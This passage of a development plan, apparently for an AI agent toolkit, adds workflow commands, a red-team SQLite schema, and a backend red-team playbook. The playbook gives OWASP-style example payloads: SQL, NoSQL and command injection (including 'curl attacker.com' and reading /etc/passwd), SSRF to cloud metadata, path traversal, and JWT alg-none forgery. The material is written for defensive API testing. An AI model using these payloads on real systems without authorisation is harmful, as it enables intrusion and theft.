   a. Check dependencies are satisfied
   b. Invoke the designated agent with the designated command
   c. Verify success criteria
   d. Record results in SQLite
6. **Handle failures** — Retry up to `max_retries`, then pause for user input
7. **Complete** — Set workflow status to `completed`, record total duration

## Output
Per step:
- Step N/total: "Step Title" (agent: agent-name)
- Status: completed | failed | retrying
- Duration: Xms

Final:
- Workflow: completed | paused | aborted
- Total duration
- Steps: X/Y completed
- SQLite records updated

## Rules
- Validate preset exists before starting
- Never run steps out of dependency order
- Always record state transitions in SQLite
- Pause and report if a step fails after max retries
- Respect workflow timeout_ms

## Examples
```

/workflow-start tdd-feature # Start TDD workflow
/workflow-start security-audit # Start security audit
/workflow-start full-feature # Start full feature with interview

```

## Related

- **Skills**: [workflow-orchestration](../skills/workflow-orchestration/SKILL.md)
- **Commands**: [/workflow-resume](./workflow-resume.md), [/workflow-status](./workflow-status.md)
```

- [ ] **Step 2: Create workflow-resume.md**

Create `commands/workflow-resume.md`:

```markdown
# /workflow-resume

## Description

Resume a paused or failed workflow from the last incomplete step. Allows retrying failed steps, skipping them (if allowed), or aborting the workflow.

## Usage
```

/workflow-resume
/workflow-resume --workflow-id tdd-feature-20260403T120000
/workflow-resume --skip
/workflow-resume --abort

```

## Process
1. **Find paused workflow** — Query `workflow_instances` for status = `paused` (most recent if no ID given)
2. **Show status** — Display current state, completed steps, and the failed/paused step
3. **User choice**:
   a. **Retry** (default) — Re-execute the failed step
   b. **Skip** (`--skip`) — Mark step as `aborted`, move to next (only if `allow_skip: true`)
   c. **Abort** (`--abort`) — Set workflow to `aborted`, stop execution
4. **Continue** — Resume sequential execution from the current step
5. **Update tracking** — Record all state changes in SQLite

## Output
Resume report:
- Workflow: <name> (<workflow_id>)
- Paused at step: <step_id> (<step_title>)
- Reason: <failure_reason>
- Action taken: retry | skip | abort
- Result: continued | completed | aborted

## Rules
- Only one workflow can be resumed at a time
- Cannot skip mandatory steps (respect `allow_skip` config)
- If retrying, increment retry count and respect max_retries
- Record the resume action in SQLite
- If the same step fails again after resume, pause again

## Examples
```

/workflow-resume # Resume most recent paused workflow
/workflow-resume --skip # Skip the failed step
/workflow-resume --abort # Abort the workflow

```

## Related

- **Skills**: [workflow-orchestration](../skills/workflow-orchestration/SKILL.md)
- **Commands**: [/workflow-start](./workflow-start.md), [/workflow-status](./workflow-status.md)
```

- [ ] **Step 3: Create workflow-status.md**

Create `commands/workflow-status.md`:

```markdown
# /workflow-status

## Description

Check the status of active, paused, or recently completed workflows. Shows step-by-step progress, timing data, and identifies bottlenecks.

## Usage
```

/workflow-status
/workflow-status --workflow-id tdd-feature-20260403T120000
/workflow-status --history
/workflow-status --bottlenecks

```

## Process
1. **Query workflows** — Read from `workflow_instances` table
   - Default: show active/paused workflows
   - `--history`: show recent completed/aborted workflows
   - `--bottlenecks`: query `v_step_bottlenecks` view
2. **Display status** — For each workflow:
   - Name, ID, status, started_at
   - Progress: X/Y steps completed
   - Current step (if in_progress or paused)
   - Duration so far
3. **Step detail** — List each step with:
   - Status, duration, retries, agent
   - Failure reason (if failed)
4. **Efficiency stats** (with `--history`):
   - Query `v_workflow_efficiency` view
   - Show completion rate and average duration per workflow type

## Output
Active workflow:
```

Workflow: tdd-feature (tdd-feature-20260403T120000)
Status: in_progress | 4/6 steps completed | 45.2s elapsed
Steps:
✓ plan (planner) — 8.1s
✓ write-test (tdd-guide) — 12.3s
✓ implement (tdd-guide) — 15.8s
→ refactor (code-reviewer) — in progress (9.0s)
· security-review (security-reviewer) — pending
· commit (tdd-guide) — pending

```

Bottleneck report:
```

Step Bottlenecks (by avg duration):
implement (tdd-guide) — avg 18.5s, 3 retries across 5 runs
refactor (code-reviewer) — avg 12.1s, 0 retries across 5 runs

```

## Rules
- Read-only operation — never modify workflow state
- Show all active workflows by default
- Include timing data for completed steps
- Flag steps with high retry counts as potential issues

## Examples
```

/workflow-status # Show active workflows
/workflow-status --history # Show recent history
/workflow-status --bottlenecks # Show step bottleneck analysis

```

## Related

- **Skills**: [workflow-orchestration](../skills/workflow-orchestration/SKILL.md)
- **Commands**: [/workflow-start](./workflow-start.md), [/workflow-resume](./workflow-resume.md)
```

- [ ] **Step 4: Commit**

```bash
git add commands/workflow-start.md commands/workflow-resume.md commands/workflow-status.md
git commit -m "feat: add workflow-start, workflow-resume, workflow-status commands"
```

---

## Task 10: Create red-team-schema.sql

**Files:**

- Create: `templates/generic/.bbg/scripts/red-team-schema.sql`

- [ ] **Step 1: Create red-team-schema.sql with 3 tables + 2 views**

Create `templates/generic/.bbg/scripts/red-team-schema.sql`:

```sql
-- =============================================================================
-- red-team-schema.sql — BBG Red Team Testing Schema
-- 3 tables + 2 views for tracking red team rounds, findings, and attack chains.
-- Conditional: only deployed for backend projects.
-- Run: sqlite3 .bbg/telemetry.db < .bbg/scripts/red-team-schema.sql
-- =============================================================================

PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

-- ---------------------------------------------------------------------------
-- Red team rounds — one row per testing round (Round 1 = sweep, Round 2 = creative)
-- ---------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS red_team_rounds (
  id                  INTEGER PRIMARY KEY AUTOINCREMENT,
  timestamp           TEXT    NOT NULL DEFAULT (datetime('now')),
  session_id          TEXT,
  workflow_id         TEXT,
  round_number        INTEGER NOT NULL,
  round_type          TEXT    NOT NULL,
  endpoints_checked   INTEGER,
  categories_checked  INTEGER,
  findings_total      INTEGER DEFAULT 0,
  findings_critical   INTEGER DEFAULT 0,
  findings_high       INTEGER DEFAULT 0,
  findings_medium     INTEGER DEFAULT 0,
  findings_low        INTEGER DEFAULT 0,
  verdict             TEXT,
  report_path         TEXT,
  duration_ms         INTEGER
);

-- ---------------------------------------------------------------------------
-- Red team findings — individual vulnerability findings from rounds
-- ---------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS red_team_findings (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  round_id        INTEGER NOT NULL REFERENCES red_team_rounds(id),
  finding_id      TEXT    NOT NULL,
  attack_id       TEXT    NOT NULL,
  domain          TEXT    NOT NULL,
  endpoint        TEXT,
  severity        TEXT    NOT NULL,
  score           REAL,
  title           TEXT    NOT NULL,
  status          TEXT    NOT NULL DEFAULT 'open',
  fixed_at        TEXT,
  details         TEXT    -- JSON blob for finding details
);

-- ---------------------------------------------------------------------------
-- Red team attack chains — multi-step combined attacks from Round 2
-- ---------------------------------------------------------------------------

CREATE TABLE IF NOT EXISTS red_team_chains (
  id              INTEGER PRIMARY KEY AUTOINCREMENT,
  round_id        INTEGER NOT NULL REFERENCES red_team_rounds(id),
  chain_id        TEXT    NOT NULL,
  title           TEXT    NOT NULL,
  steps           TEXT    NOT NULL,
  preconditions   TEXT,
  impact          TEXT,
  mitigation      TEXT,
  status          TEXT    NOT NULL DEFAULT 'open'
);

-- ---------------------------------------------------------------------------
-- Indexes
-- ---------------------------------------------------------------------------

CREATE INDEX IF NOT EXISTS idx_rtr_session     ON red_team_rounds(session_id);
CREATE INDEX IF NOT EXISTS idx_rtr_workflow    ON red_team_rounds(workflow_id);
CREATE INDEX IF NOT EXISTS idx_rtr_type        ON red_team_rounds(round_type);
CREATE INDEX IF NOT EXISTS idx_rtf_round       ON red_team_findings(round_id);
CREATE INDEX IF NOT EXISTS idx_rtf_domain      ON red_team_findings(domain);
CREATE INDEX IF NOT EXISTS idx_rtf_severity    ON red_team_findings(severity);
CREATE INDEX IF NOT EXISTS idx_rtf_status      ON red_team_findings(status);
CREATE INDEX IF NOT EXISTS idx_rtc_round       ON red_team_chains(round_id);

-- ---------------------------------------------------------------------------
-- Views
-- ---------------------------------------------------------------------------

-- v_red_team_trend — daily trend of red team rounds and findings
CREATE VIEW IF NOT EXISTS v_red_team_trend AS
SELECT
  date(timestamp)                                          AS day,
  round_type,
  COUNT(*)                                                 AS total_rounds,
  AVG(findings_critical + findings_high)                   AS avg_critical_high,
  SUM(CASE WHEN verdict = 'PASS' THEN 1 ELSE 0 END)      AS pass_count,
  SUM(CASE WHEN verdict = 'BLOCK' THEN 1 ELSE 0 END)     AS block_count
FROM red_team_rounds
GROUP BY day, round_type;

-- v_attack_domain_heatmap — findings by domain and severity
CREATE VIEW IF NOT EXISTS v_attack_domain_heatmap AS
SELECT
  domain,
  severity,
  COUNT(*)                                                          AS finding_count,
  SUM(CASE WHEN status IN ('open', 'mitigated') THEN 1 ELSE 0 END) AS unresolved
FROM red_team_findings
GROUP BY domain, severity
ORDER BY finding_count DESC;
```

- [ ] **Step 2: Verify the file exists**

Run: `wc -l templates/generic/.bbg/scripts/red-team-schema.sql`
Expected: ~110 lines

- [ ] **Step 3: Commit**

```bash
git add templates/generic/.bbg/scripts/red-team-schema.sql
git commit -m "feat: add red team SQLite schema (3 tables + 2 views)"
```

---

## Task 11: Create red-team-test skill

**Files:**

- Create: `skills/red-team-test/SKILL.md`

- [ ] **Step 1: Create the skill directory**

Run: `mkdir -p skills/red-team-test`

- [ ] **Step 2: Create the red team testing skill**

Create `skills/red-team-test/SKILL.md`:

```markdown
---
name: red-team-test
category: security
description: Backend red team testing — 2-round protocol with OWASP-based attack taxonomy, severity scoring, and structured reporting
---

# Red Team Testing

## Overview

Load this skill when performing red team security testing on backend API projects. This skill implements a 2-round protocol: Round 1 is a systematic sweep across all endpoints and attack categories; Round 2 is adversarial creative testing with chained attacks and boundary probing.

## Applicability

This skill applies to backend projects only:

- Java (Spring Boot, Quarkus, Micronaut)
- Go (Gin, Echo, Fiber, net/http)
- Python with web frameworks (Django, FastAPI, Flask)
- Rust (Axum, Actix-web, Rocket)

## Attack Taxonomy (6 Domains, 22 Categories)

Based on OWASP API Security Top 10 2023 and WSTG:

### 1. Authentication & Authorization (AA)

- **AA-01**: Broken Object-Level Authorization (BOLA/IDOR)
- **AA-02**: Broken Authentication (credential stuffing, weak tokens)
- **AA-03**: Broken Function-Level Authorization (privilege escalation)
- **AA-04**: Broken Object Property-Level Authorization (mass assignment)

### 2. Input Validation & Injection (IV)

- **IV-01**: SQL Injection (classic, blind, time-based)
- **IV-02**: NoSQL Injection (MongoDB operator injection, JSON injection)
- **IV-03**: Command Injection (OS command, argument injection)
- **IV-04**: Server-Side Request Forgery (SSRF)
- **IV-05**: Path Traversal (directory traversal, file inclusion)

### 3. Business Logic (BL)

- **BL-01**: Race Conditions (TOCTOU, double-spend)
- **BL-02**: Workflow Bypass (skipping steps, state manipulation)
- **BL-03**: Rate Limit Bypass (header manipulation, distributed requests)

### 4. Resource & Configuration (RC)

- **RC-01**: Unrestricted Resource Consumption (DoS via large payloads)
- **RC-02**: Server Misconfiguration (debug endpoints, default credentials)
- **RC-03**: Improper Inventory Management (shadow APIs, deprecated endpoints)
- **RC-04**: Unsafe API Consumption (SSRF via third-party APIs)

### 5. Data Security (DS)

- **DS-01**: Excessive Data Exposure (verbose responses, PII leaks)
- **DS-02**: Sensitive Data in Logs (credentials, tokens in logs)
- **DS-03**: Insecure Data Storage (unencrypted sensitive fields)

### 6. Session & Token (ST)

- **ST-01**: JWT Vulnerabilities (algorithm confusion, weak secrets, no expiry)
- **ST-02**: Session Fixation/Hijacking (predictable IDs, no rotation)

## Two-Round Protocol

### Round 1: Systematic Sweep

**Objective:** Check every attack category against every endpoint.

**Process:**

1. Enumerate all API endpoints from routes/controllers
2. For each endpoint × attack category combination:
   a. Craft test payloads appropriate to the attack type
   b. Send requests and analyze responses
   c. Check for error message leakage
   d. Record finding or mark as "not applicable"
3. Score each finding using simplified CVSS
4. Generate Round 1 report

**Output:** Matrix of endpoint × category with finding/pass/N-A status

### Round 2: Adversarial Creative Attack

**Objective:** Think like an attacker — chain vulnerabilities, probe edge cases.

**Process:**

1. Review Round 1 findings for chaining opportunities
2. Attempt multi-step attack chains:
   - IDOR → data exfiltration → privilege escalation
   - SSRF → internal service access → credential theft
   - Race condition → double-spend → business logic abuse
3. Probe timing-based attacks:
   - Authentication timing oracle
   - Rate limit timing bypass
4. Test boundary conditions:
   - Integer overflow in pagination
   - Unicode normalization bypasses
   - Null byte injection
5. Generate Round 2 report with chain diagrams

**Output:** Attack chain descriptions with preconditions, steps, impact, and mitigation

## Severity Scoring (Simplified CVSS)

| Severity | Score Range | Action      | Blocks Release? |
| -------- | ----------- | ----------- | --------------- |
| Critical | 9.0 – 10.0  | Must fix    | Yes             |
| High     | 7.0 – 8.9   | Should fix  | Yes             |
| Medium   | 4.0 – 6.9   | Recommended | No              |
| Low      | 0.1 – 3.9   | Optional    | No              |
| Info     | 0.0         | Record only | No              |

**Scoring factors:**

- Attack complexity (low = higher score)
- Required privileges (none = higher score)
- User interaction required (none = higher score)
- Impact on confidentiality, integrity, availability

## Verdict

After both rounds:

- **PASS**: No critical or high findings remaining
- **CONDITIONAL**: High findings with accepted risk justification
- **BLOCK**: Critical findings exist, release blocked

## SQLite Tracking

Record all rounds and findings in `.bbg/telemetry.db`:

- Initialize: `sqlite3 .bbg/telemetry.db < .bbg/scripts/red-team-schema.sql`
- Trend analysis: `SELECT * FROM v_red_team_trend`
- Domain heatmap: `SELECT * FROM v_attack_domain_heatmap`

## Rules

- Always complete Round 1 before starting Round 2
- Never skip an attack category in Round 1 — mark as N/A if not applicable
- Score every finding with simplified CVSS
- Record all findings in SQLite, even informational ones
- Generate structured report using `docs/reports/red-team-report-TEMPLATE.md`
- Reference playbook: `docs/security/backend-red-team-playbook.md`

## Checklist

- [ ] All API endpoints enumerated
- [ ] Round 1: every endpoint × category combination checked
- [ ] All findings scored with severity
- [ ] Round 2: attack chains explored
- [ ] Round 2: timing and boundary attacks attempted
- [ ] SQLite records created for both rounds
- [ ] Structured report generated
- [ ] Verdict determined (PASS/CONDITIONAL/BLOCK)

## Related

- **Skills**: [security-review](../security-review/SKILL.md), [security-hardening](../security-hardening/SKILL.md)
- **Commands**: [/red-team](../../commands/red-team.md), [/security-scan](../../commands/security-scan.md)
- **Docs**: [backend-red-team-playbook](../../docs/security/backend-red-team-playbook.md)
```

- [ ] **Step 3: Verify the file exists**

Run: `wc -l skills/red-team-test/SKILL.md`
Expected: ~140-150 lines

- [ ] **Step 4: Commit**

```bash
git add skills/red-team-test/SKILL.md
git commit -m "feat: add red-team-test skill with 2-round protocol"
```

---

## Task 12: Create red-team command

**Files:**

- Create: `commands/red-team.md`

- [ ] **Step 1: Create the red team command**

Create `commands/red-team.md`:

```markdown
# /red-team

## Description

Execute red team security testing against backend API endpoints using the 2-round protocol. Round 1 performs a systematic sweep across all attack categories; Round 2 performs adversarial creative attacks with chaining. Results are recorded in SQLite and a structured report is generated.

## Usage
```

/red-team
/red-team --round 1
/red-team --round 2
/red-team --endpoint /api/v1/users
/red-team --domain "authentication"

```

## Process
1. **Verify applicability** — Confirm this is a backend project (Java, Go, Python+web, Rust)
2. **Enumerate endpoints** — Scan routes/controllers for all API endpoints
3. **Round 1 — Systematic Sweep**:
   a. For each endpoint × attack category (6 domains, 22 categories):
      - Craft appropriate test payloads
      - Analyze responses for vulnerabilities
      - Score findings with simplified CVSS
   b. Generate Round 1 findings matrix
4. **Round 2 — Adversarial Creative Attack**:
   a. Review Round 1 findings for chaining opportunities
   b. Attempt multi-step attack chains
   c. Probe timing-based and boundary attacks
   d. Document attack chains with preconditions and impact
5. **Score and report**:
   - Apply severity scoring to all findings
   - Determine verdict (PASS / CONDITIONAL / BLOCK)
   - Generate report from template
6. **Record in SQLite** — Insert rounds, findings, and chains

## Output
Per round:
- Endpoints checked: N
- Categories tested: M
- Findings: X critical, Y high, Z medium, W low

Final:
- Verdict: PASS | CONDITIONAL | BLOCK
- Report path: `docs/reports/red-team-report-<date>.md`
- SQLite records: N rounds, M findings, K chains

## Rules
- Only run on backend projects — abort with clear message for frontend-only projects
- Always complete Round 1 before Round 2
- Never skip attack categories — mark as N/A if genuinely not applicable
- Score every finding with simplified CVSS (0.0-10.0)
- Block release if any critical (9.0+) findings remain open
- Record all results in SQLite for trend analysis
- Use `docs/security/backend-red-team-playbook.md` as the attack reference
- Generate report using `docs/reports/red-team-report-TEMPLATE.md`

## Examples
```

/red-team # Full 2-round red team test
/red-team --round 1 # Round 1 only (systematic sweep)
/red-team --round 2 # Round 2 only (creative attacks, requires Round 1)
/red-team --endpoint /api/v1/auth # Focus on specific endpoint

```

## Related

- **Skills**: [red-team-test](../skills/red-team-test/SKILL.md), [security-review](../skills/security-review/SKILL.md)
- **Commands**: [/security-scan](./security-scan.md), [/workflow-start](./workflow-start.md)
```

- [ ] **Step 2: Commit**

```bash
git add commands/red-team.md
git commit -m "feat: add red-team command for 2-round backend security testing"
```

---

## Task 13: Replace backend-red-team-playbook.md stub with full content

**Files:**

- Replace: `templates/generic/docs/security/backend-red-team-playbook.md`

- [ ] **Step 1: Replace the 3-line stub with the full attack handbook**

Overwrite `templates/generic/docs/security/backend-red-team-playbook.md` with:

```markdown
# Backend Red Team Playbook

A comprehensive attack handbook for AI-driven red team testing of backend APIs. Based on OWASP API Security Top 10 (2023) and OWASP Web Security Testing Guide (WSTG).

## How to Use This Playbook

1. Start with `/red-team` command or the red-team step in a workflow preset
2. Use this playbook as the reference for Round 1 (systematic sweep)
3. Each category lists: description, check procedure, example payloads, and expected indicators
4. Score all findings using the severity table at the end

---

## Domain 1: Authentication & Authorization (AA)

### AA-01: Broken Object-Level Authorization (BOLA/IDOR)

**Description:** Attacker accesses resources belonging to other users by manipulating object IDs in requests.

**Check Procedure:**

1. Authenticate as User A, note resource IDs
2. Authenticate as User B
3. Replace User B's resource IDs with User A's IDs in requests
4. Check if User B can access/modify User A's resources

**Example Payloads:**
```

GET /api/v1/orders/1001 # User A's order
GET /api/v1/orders/1002 # User B tries User A's order
PUT /api/v1/users/42/profile # Modify another user's profile
DELETE /api/v1/documents/99 # Delete another user's document

```

**Indicators of Vulnerability:**
- HTTP 200 returned for another user's resources
- Data from another user visible in response body
- Modification succeeds without ownership check

### AA-02: Broken Authentication

**Description:** Weaknesses in authentication mechanisms allowing credential stuffing, brute force, or token prediction.

**Check Procedure:**
1. Test login endpoint for rate limiting
2. Attempt credential stuffing with common passwords
3. Check token entropy and predictability
4. Verify password reset flow for information leakage
5. Test for authentication bypass via header manipulation

**Example Payloads:**
```

POST /api/v1/auth/login {"email":"admin@test.com","password":"password123"}
POST /api/v1/auth/login {"email":"admin@test.com","password":"admin"}
POST /api/v1/auth/login {"email":"admin@test.com","password":"123456"}

# Repeat with top-1000 passwords list

GET /api/v1/me Authorization: Bearer <expired-token>
GET /api/v1/me Authorization: Bearer <modified-token>

```

**Indicators of Vulnerability:**
- No rate limiting on login endpoint
- Generic vs. specific error messages (user enumeration)
- Tokens with low entropy or predictable patterns
- Expired tokens still accepted

### AA-03: Broken Function-Level Authorization (Privilege Escalation)

**Description:** Regular user accesses admin or elevated-privilege endpoints by changing request parameters or paths.

**Check Procedure:**
1. Identify admin-only endpoints from documentation or route enumeration
2. Authenticate as regular user
3. Attempt to access admin endpoints with regular user token
4. Test role manipulation in request body or headers

**Example Payloads:**
```

GET /api/v1/admin/users # Admin endpoint with regular token
POST /api/v1/users {"role":"admin"} # Self-promote via mass assignment
PUT /api/v1/users/42 {"isAdmin":true}
DELETE /api/v1/users/42 # Delete user as non-admin
GET /api/internal/metrics # Internal endpoint exposure

```

**Indicators of Vulnerability:**
- Admin endpoints return 200 for regular users
- Role field accepted in user creation/update without validation
- Internal endpoints accessible without special authentication

### AA-04: Broken Object Property-Level Authorization (Mass Assignment)

**Description:** API accepts properties that should not be user-controllable, allowing attackers to modify protected fields.

**Check Procedure:**
1. Send create/update requests with extra undocumented fields
2. Check if protected fields (role, balance, verified) are modified
3. Compare request schema with actual accepted fields

**Example Payloads:**
```

POST /api/v1/users {"name":"test","email":"test@test.com","role":"admin","verified":true}
PUT /api/v1/orders/1 {"status":"completed","total":0.01}
PATCH /api/v1/account {"balance":999999,"tier":"premium"}

```

**Indicators of Vulnerability:**
- Extra fields silently accepted and persisted
- Protected fields (role, balance) modifiable by user
- Response shows modified protected fields

---

## Domain 2: Input Validation & Injection (IV)

### IV-01: SQL Injection

**Description:** Attacker injects SQL code through user-controllable inputs to read, modify, or delete database contents.

**Check Procedure:**
1. Identify all parameters that could reach SQL queries
2. Test each with classic, blind, and time-based payloads
3. Check for error messages revealing database structure
4. Test ORDER BY, LIMIT, and filter parameters

**Example Payloads:**
```

GET /api/v1/users?name=admin' OR '1'='1
GET /api/v1/users?sort=name; DROP TABLE users;--
GET /api/v1/search?q=test' UNION SELECT username,password FROM users--
GET /api/v1/users?id=1 AND SLEEP(5) # Time-based blind
GET /api/v1/products?category=1' AND 1=1-- # Boolean-based blind
POST /api/v1/login {"email":"admin'--","password":"x"}

```

**Indicators of Vulnerability:**
- SQL error messages in response
- Different responses for `1=1` vs `1=2` injections
- Measurable time delay with SLEEP/WAITFOR payloads
- UNION-based queries returning extra data

### IV-02: NoSQL Injection

**Description:** Attacker manipulates NoSQL query operators (MongoDB, Elasticsearch) through JSON input.

**Check Procedure:**
1. Test JSON parameters with MongoDB operators
2. Check for operator injection in query strings
3. Test regex-based injection

**Example Payloads:**
```

POST /api/v1/login {"email":{"$gt":""},"password":{"$gt":""}}
POST /api/v1/login {"email":{"$regex":"admin.*"},"password":{"$ne":""}}
GET /api/v1/users?email[$ne]=nonexistent
GET /api/v1/search?q[$regex]=.\*
POST /api/v1/query {"filter":{"$where":"sleep(5000)"}}

```

**Indicators of Vulnerability:**
- Login succeeds with operator injection
- Response returns unexpected records
- Time delays with `$where` expressions

### IV-03: Command Injection

**Description:** Attacker injects OS commands through parameters that are passed to shell execution.

**Check Procedure:**
1. Identify parameters that might trigger shell commands (filenames, URLs, conversion tools)
2. Test with command separators and substitutions
3. Check for blind command injection via timing

**Example Payloads:**
```

POST /api/v1/convert {"filename":"test.pdf; whoami"}
POST /api/v1/convert {"filename":"test.pdf | cat /etc/passwd"}
POST /api/v1/export {"format":"csv$(sleep 5)"}
POST /api/v1/webhook {"url":"http://example.com; curl attacker.com"}
GET /api/v1/ping?host=127.0.0.1;id

```

**Indicators of Vulnerability:**
- System command output in response
- Time delays indicating blind injection
- Error messages revealing shell execution context

### IV-04: Server-Side Request Forgery (SSRF)

**Description:** Attacker causes the server to make requests to unintended destinations, potentially accessing internal services.

**Check Procedure:**
1. Identify parameters that accept URLs or hostnames
2. Test with internal IP ranges and cloud metadata endpoints
3. Check for DNS rebinding opportunities
4. Test URL scheme handling (file://, gopher://, dict://)

**Example Payloads:**
```

POST /api/v1/webhook {"url":"http://169.254.169.254/latest/meta-data/"}
POST /api/v1/import {"url":"http://127.0.0.1:6379/"}
POST /api/v1/preview {"url":"file:///etc/passwd"}
POST /api/v1/fetch {"url":"http://internal-service:8080/admin"}
POST /api/v1/avatar {"url":"http://0x7f000001:3306/"} # Hex IP bypass

```

**Indicators of Vulnerability:**
- Cloud metadata returned in response
- Internal service data accessible
- Different response times for valid vs. invalid internal hosts

### IV-05: Path Traversal

**Description:** Attacker accesses files outside intended directories by manipulating file path parameters.

**Check Procedure:**
1. Identify file-serving or file-reading endpoints
2. Test with `../` sequences and encoding variations
3. Check for null byte injection (older systems)

**Example Payloads:**
```

GET /api/v1/files?path=../../../etc/passwd
GET /api/v1/download?file=....//....//etc/passwd
GET /api/v1/assets/%2e%2e%2f%2e%2e%2fetc%2fpasswd
GET /api/v1/read?name=..%252f..%252fetc%252fpasswd # Double encoding
GET /api/v1/template?name=../config/database.yml

```

**Indicators of Vulnerability:**
- File contents from outside web root returned
- Different error messages for existing vs. non-existing paths
- System file contents in response

---

## Domain 3: Business Logic (BL)

### BL-01: Race Conditions

**Description:** Exploiting time-of-check-to-time-of-use (TOCTOU) gaps to bypass validation or double-spend resources.

**Check Procedure:**
1. Identify state-changing operations with checks (balance, inventory, votes)
2. Send concurrent identical requests
3. Check for inconsistent final state

**Example Payloads:**
```

# Send 10 simultaneous requests:

POST /api/v1/transfer {"from":"A","to":"B","amount":100} # ×10 concurrent
POST /api/v1/redeem {"code":"PROMO50"} # ×5 concurrent
POST /api/v1/vote {"option":"A"} # ×3 concurrent

```

**Indicators of Vulnerability:**
- Balance goes negative after concurrent transfers
- Promo code redeemed multiple times
- Vote count exceeds expected value

### BL-02: Workflow Bypass

**Description:** Skipping required steps in multi-step processes by directly accessing later steps.

**Check Procedure:**
1. Map multi-step workflows (checkout, verification, approval)
2. Attempt to access final steps directly, skipping intermediates
3. Manipulate state tokens or step indicators

**Example Payloads:**
```

# Skip payment step:

POST /api/v1/orders/123/confirm # Without completing payment
POST /api/v1/orders/123/ship # Without confirmation

# Skip email verification:

POST /api/v1/users/verify {"token":"manipulated","verified":true}

```

**Indicators of Vulnerability:**
- Order completes without payment
- Actions succeed without required preconditions
- State can be manipulated via request parameters

### BL-03: Rate Limit Bypass

**Description:** Circumventing rate limiting through header manipulation, distributed requests, or endpoint variations.

**Check Procedure:**
1. Identify rate-limited endpoints
2. Test bypass techniques: IP rotation headers, case variations, path variations
3. Measure actual enforcement

**Example Payloads:**
```

# Header manipulation:

X-Forwarded-For: 1.2.3.4 # Different IPs per request
X-Real-IP: 5.6.7.8

# Path variation:

/api/v1/login
/api/v1/LOGIN
/api/v1/login/
/api/v1/../v1/login

```

**Indicators of Vulnerability:**
- Rate limit bypassed with forged IP headers
- Different path casing bypasses rate limit
- Trailing slashes create separate rate limit buckets

---

## Domain 4: Resource & Configuration (RC)

### RC-01: Unrestricted Resource Consumption

**Description:** Sending large payloads, deep nesting, or expensive queries to cause denial of service.

**Check Procedure:**
1. Send oversized request bodies
2. Test deeply nested JSON
3. Test large file uploads
4. Check pagination limits (request page_size=999999)

**Example Payloads:**
```

POST /api/v1/data {"a":{"b":{"c":{"d":...}}}} # 100 levels deep
POST /api/v1/import <10MB JSON body>
GET /api/v1/users?page_size=999999
POST /api/v1/search {"query":"\*","include_all":true}
POST /api/v1/upload <1GB file>

```

**Indicators of Vulnerability:**
- Server crashes or becomes unresponsive
- Extremely slow responses (>30s)
- Out-of-memory errors in logs

### RC-02: Server Misconfiguration

**Description:** Debug endpoints, default credentials, or verbose error messages exposed in production.

**Check Procedure:**
1. Check common debug endpoints
2. Test default credentials
3. Check HTTP response headers for information leakage
4. Look for environment/version disclosure

**Example Payloads:**
```

GET /debug/pprof/ # Go profiling
GET /actuator/env # Spring Boot
GET /**debug**/ # Django debug
GET /api/v1/healthz # Kubernetes health
GET /swagger-ui/ or /api-docs # API documentation
GET /.env # Environment file

```

**Indicators of Vulnerability:**
- Debug endpoints accessible without authentication
- Stack traces with file paths and versions
- Default admin credentials work

### RC-03: Improper Inventory Management

**Description:** Shadow APIs, deprecated endpoints, and undocumented routes that are still accessible.

**Check Procedure:**
1. Compare documented endpoints with actual routes
2. Check for versioned APIs (v1, v2) — test if v0 or beta exists
3. Look for test/staging endpoints

**Example Payloads:**
```

GET /api/v0/users # Old API version
GET /api/beta/features # Beta endpoint
GET /api/v1/test/reset # Test endpoint
GET /api/internal/admin # Internal endpoint

```

**Indicators of Vulnerability:**
- Undocumented endpoints return data
- Old API versions accessible without deprecation
- Test endpoints available in production

### RC-04: Unsafe API Consumption

**Description:** Server-side consumption of third-party APIs without proper validation, enabling SSRF or data injection via upstream services.

**Check Procedure:**
1. Identify outbound API calls (webhooks, integrations, imports)
2. Test if responses from third parties are sanitized
3. Check for SSRF through redirect chains

**Example Payloads:**
```

# Webhook callback with malicious redirect:

POST /api/v1/webhook/register {"url":"http://attacker.com/redirect-to-internal"}

# Import with malicious content:

POST /api/v1/import/csv <CSV with formula injection: =SYSTEM("cmd")>

```

**Indicators of Vulnerability:**
- Third-party responses rendered without sanitization
- Redirect chains followed to internal services
- Malicious content from imports executed or stored unsanitized

---

## Domain 5: Data Security (DS)

### DS-01: Excessive Data Exposure

**Description:** API responses include more data than needed, exposing sensitive fields like passwords, tokens, or PII.

**Check Procedure:**
1. Examine all API responses for sensitive fields
2. Check if admin-only fields appear in regular user responses
3. Look for full object dumps instead of projected views

**Example Payloads:**
```

GET /api/v1/users/me # Check for password_hash, SSN, etc.
GET /api/v1/users # List endpoint may expose all fields
GET /api/v1/orders/123 # May include other users' data in nested objects

```

**Indicators of Vulnerability:**
- Password hashes, tokens, or secrets in responses
- PII (SSN, credit card) in responses that don't need it
- Internal IDs, database fields, or debug info exposed

### DS-02: Sensitive Data in Logs

**Description:** Credentials, tokens, or PII written to log files or error output.

**Check Procedure:**
1. Trigger errors with various inputs and check error responses
2. Check if request bodies with credentials appear in logs
3. Test for stack traces that include sensitive data

**Example Payloads:**
```

POST /api/v1/login {"email":"test@test.com","password":"secret123"}

# Check if "secret123" appears in error logs

GET /api/v1/error-test Authorization: Bearer <token>

# Check if token appears in error output

```

**Indicators of Vulnerability:**
- Passwords visible in log files
- Tokens included in error messages
- PII in stack traces or debug output

### DS-03: Insecure Data Storage

**Description:** Sensitive data stored without encryption, in plain text, or with weak encryption.

**Check Procedure:**
1. Check API responses for encryption indicators
2. Test if sensitive operations use HTTPS only
3. Verify encrypted fields cannot be compared (timing oracle)

**Indicators of Vulnerability:**
- Passwords stored as MD5 or SHA1 (without salt)
- API accessible over HTTP (not HTTPS)
- Sensitive fields queryable/sortable (implies no encryption)

---

## Domain 6: Session & Token (ST)

### ST-01: JWT Vulnerabilities

**Description:** Weaknesses in JWT implementation allowing token forgery, replay, or privilege escalation.

**Check Procedure:**
1. Decode JWT and examine header/payload
2. Test algorithm confusion (change RS256 to HS256)
3. Check for "none" algorithm acceptance
4. Test with expired tokens
5. Check for weak signing secrets

**Example Payloads:**
```

# Algorithm confusion — change header to HS256 and sign with public key:

{"alg":"HS256","typ":"JWT"}

# None algorithm:

{"alg":"none","typ":"JWT"}.<base64-payload>.

# Expired token reuse:

Authorization: Bearer <token-expired-1-hour-ago>

# Modified claims:

